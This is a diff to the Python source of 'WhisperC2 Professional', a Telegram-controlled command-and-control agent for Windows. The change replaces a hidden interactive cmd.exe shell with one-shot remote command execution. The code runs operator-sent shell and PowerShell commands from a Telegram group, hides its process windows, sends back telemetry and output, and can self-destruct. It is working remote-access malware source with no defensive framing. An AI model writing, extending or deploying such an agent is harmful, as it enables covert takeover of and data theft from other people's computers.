@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – Shell‑Hardened (cmd.exe, echo off, robust)
+# WhisperC2 Professional – Reliable One‑Shot Shell (No Interactive Mode)
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
 import shutil, winreg, ctypes, requests
@@ -63,9 +63,6 @@ HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]
 TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
 PID_FILE = Path(agents_dir) / "agent.pid"
 
-# -----------------------------------------------------------------------------
-# Kill old instance if any
-# -----------------------------------------------------------------------------
 def kill_old_instance():
     if PID_FILE.exists():
         try:
@@ -128,9 +125,6 @@ def send_telemetry(topic_id, status: str) -> bool:
     except:
         return False
 
-# -----------------------------------------------------------------------------
-# Topic management
-# -----------------------------------------------------------------------------
 def load_topic_id() -> int | None:
     if TOPIC_ID_FILE.exists():
         try:
@@ -211,95 +205,7 @@ def self_destruct(topic_id) -> None:
         pass
 
 # -----------------------------------------------------------------------------
-# Interactive shell (cmd.exe, echo off, hot‑plug resilient)
-# -----------------------------------------------------------------------------
-shell_active = False
-shell_process = None
-_shell_topic_id = None
-shell_lock = threading.Lock()
-
-def spawn_shell(topic_id) -> bool:
-    global shell_active, shell_process, _shell_topic_id
-    with shell_lock:
-        # If a shell is already active, kill it (stale) and restart cleanly
-        if shell_active:
-            kill_shell()
-        _shell_topic_id = topic_id
-        try:
-            shell_process = subprocess.Popen(
-                "cmd.exe",
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                text=True,
-                bufsize=0,
-                creationflags=0x08000000
-            )
-            shell_active = True
-            # Suppress command echo immediately
-            write_shell("@echo off")
-            threading.Thread(target=shell_reader, daemon=True).start()
-            log("Interactive shell spawned")
-            return True
-        except Exception as e:
-            log(f"Shell spawn failed: {e}")
-            return False
-
-def shell_reader() -> None:
-    global shell_active
-    while shell_active and shell_process and shell_process.stdout:
-        if shell_process.poll() is not None:
-            log("Shell process died")
-            break
-        try:
-            line = shell_process.stdout.readline()
-            if not line:
-                break
-            # Strip trailing whitespace but keep the content
-            line = line.rstrip('\n\r')
-            if not line:
-                continue
-            safe = line.replace('```', "'''")
-            for chunk in [safe[i:i+3900] for i in range(0, len(safe), 3900)]:
-                try:
-                    bot.send_message(GROUP_CHAT_ID,
-                                     f"```\n{chunk}\n```",
-                                     message_thread_id=_shell_topic_id,
-                                     parse_mode='Markdown')
-                    time.sleep(0.25)
-                except Exception:
-                    # Don't break on a single send failure
-                    pass
-        except (IOError, OSError) as e:
-            log(f"Shell pipe error: {e}")
-            break
-        except Exception as e:
-            log(f"Shell read error: {e}")
-            # Continue unless process has died
-            if shell_process and shell_process.poll() is not None:
-                break
-    kill_shell()
-
-def kill_shell() -> None:
-    global shell_active, shell_process
-    shell_active = False
-    if shell_process:
-        try:
-            shell_process.stdin.close()
-            shell_process.terminate()
-        except:
-            pass
-
-def write_shell(cmd: str) -> None:
-    if shell_active and shell_process and shell_process.stdin:
-        try:
-            shell_process.stdin.write(cmd + "\r\n")
-            shell_process.stdin.flush()
-        except:
-            kill_shell()
-
-# -----------------------------------------------------------------------------
-# Command helpers & dispatcher
+# Command helpers (no interactive shell)
 # -----------------------------------------------------------------------------
 def sys_cmd(cmd: str) -> str:
     try:
@@ -371,8 +277,8 @@ def execute_command(cmd_line: str, topic_id):
     if cmd in ("ping","start","scan"):
         return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None
     elif cmd == "shell":
-        if args: return sys_cmd(args).replace('```',"'''"), None
-        return ("💬 Interactive shell started. Type `exit` to close.", None) if spawn_shell(topic_id) else ("❌ Failed to spawn shell.", None)
+        if not args: return "Usage: shell <command>", None
+        return sys_cmd(args).replace('```',"'''"), None
     elif cmd in ("powershell","pow"):
         if not args: return "Usage: powershell <command>", None
         return ps_cmd(args).replace('```',"'''"), None
@@ -395,7 +301,7 @@ def execute_command(cmd_line: str, topic_id):
         return f"❓ Unknown: {cmd}", None
 
 # -----------------------------------------------------------------------------
-# Main
+# Main – no interactive shell logic
 # -----------------------------------------------------------------------------
 def main():
     try:
@@ -426,17 +332,6 @@ def main():
                     return
             text = (message.text or "").strip()
             if not text: return
-            if shell_active:
-                clean = text[1:] if text.startswith('/') else text
-                if clean.lower() == "exit":
-                    kill_shell()
-                    bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown', message_thread_id=topic_id)
-                elif clean.lower().startswith("die"):
-                    kill_shell()
-                    execute_command("die", topic_id)
-                else:
-                    write_shell(clean)
-                return
             if text.startswith('/'): text = text[1:]
             response, file_path = execute_command(text, topic_id)
             reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
